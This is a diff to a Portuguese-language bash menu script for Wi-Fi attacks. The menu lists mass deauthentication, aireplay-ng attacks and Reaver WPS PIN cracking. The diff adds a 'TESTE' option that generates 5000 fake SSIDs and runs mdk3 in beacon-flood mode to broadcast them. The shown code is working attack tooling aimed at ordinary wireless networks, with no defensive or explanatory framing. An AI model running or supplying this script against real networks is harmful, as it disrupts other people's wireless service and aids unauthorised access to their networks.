@@ -31,7 +31,7 @@ echo "** 7. Desautenticação em Massa Derruba Ate a Sua Rede ***"
 echo "** 8. Ataca 6 Redes (Aireplay-ng)                     ***"
 echo "** 9. Descobre ou Tenta a Senha Metodo WPS (Reaver)   ***"
 echo "** 10. Reinicia Sua Placa(Normal)                     ***"
-echo "**                                                    ***"
+echo "** 11. TESTE                                          ***"
 echo "*********************************************************"
 echo "**********            Anon_X95            ***************"
 echo "*********************************************************"
@@ -329,6 +329,22 @@ clear
 sleep 3
 done
 ;;
+
+11)clear
+
+echo ""
+echo "Informe um nome para o SSID:"
+read VARIAVEL 
+for ins in {1..5000} ; do
+
+echo $VARIAVEL$ins >> /tmp/ts.txt
+
+done
+(xterm -title "Redes Fakes" -e mdk3 $WIRELLES b -f /tmp/ts.txt -s 10000) &
+sleep 10
+;;
+
+
 6)clear
 echo "Vamos aos Seguintes Requistos Nessecidades:"
 echo " 1 Wordlist Com SSIDS (Facil)"
